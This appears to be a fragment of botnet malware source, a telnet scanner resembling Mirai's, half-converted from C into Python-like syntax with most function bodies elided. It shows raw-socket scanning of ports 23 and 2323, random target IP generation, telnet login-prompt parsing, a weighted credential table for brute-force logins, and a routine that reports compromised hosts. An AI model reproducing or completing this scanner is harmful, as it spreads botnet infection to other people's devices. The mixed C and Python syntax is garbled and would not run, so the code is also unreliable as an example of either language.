...
def scanner_init():
...
#endif
        os.exit(0)
    fcntl.fcntl(rsck, F_SETFL, os.O_NONBLOCK | fcntl.fcntl(rsck, F_GETFL, 0))
    i = 1
    ...
    while True:
        ...
        if fake_time != last_spew:
            ...
            for i in range(SCANNER_RAW_PPS):
        ...
        while True:
            ...
            if n <= 0 or errno == errno.EAGAIN or errno == errno.EWOULDBLOCK:
                break
            ...
            if iph.protocol != IPPROTO_TCP:
                continue
            if tcph.source != htons(23) and tcph.source != htons(2323):
                continue
            ...
            conn = NULL
            for n in range(last_avail_conn, SCANNER_MAX_CONNS):
        ...
        for i in range(SCANNER_MAX_CONNS):
            ...
            if conn.state != SC_CLOSED and (fake_time - conn.last_recv) > timeout:
#ifdef DEBUG
...
def scanner_kill():
    os.kill(scanner_pid, 9)

def setup_connection(struct scanner_connection *conn):
...
static ipv4_t get_random_ip(void)
    ...
    while True:
        ...
        o3 = (tmp >> 16) & 0xff
        o4 = (tmp >> 24) & 0xff
    while (o1 == 127 or # 127.0.0.0/8      - Loopback
...
def consume_iacs(struct scanner_connection *conn):
    consumed = 0
    ptr = conn.rdbuf
...
def consume_any_prompt(struct scanner_connection *conn):
    prompt_ending = -1
...
def consume_user_prompt(struct scanner_connection *conn):
    prompt_ending = -1
...
def consume_pass_prompt(struct scanner_connection *conn):
    prompt_ending = -1

    for (i = conn.rdbuf_pos - 1; i > 0; i--)
    {
        if conn.rdbuf[i] == ':' or conn.rdbuf[i] == '>' or conn.rdbuf[i] == '$' or conn.rdbuf[i] == '#':
            prompt_ending = i + 1
            break
...
def consume_resp_prompt(struct scanner_connection *conn):
...
def add_auth_entry(enc_user, enc_pass, weight):
...
static struct scanner_auth *random_auth_entry(void)
    r = (uint16_t)(rand_next() % auth_table_max_weight)

    for i in range(auth_table_len):
        if r < auth_table[i].weight_min:
            continue
        elif r < auth_table[i].weight_max:
            return auth_table[i]

    return NULL

def report_working(ipv4_t daddr, dport, struct scanner_auth *auth):
...
static BOOL can_consume(struct scanner_connection *conn, ptr, amount)
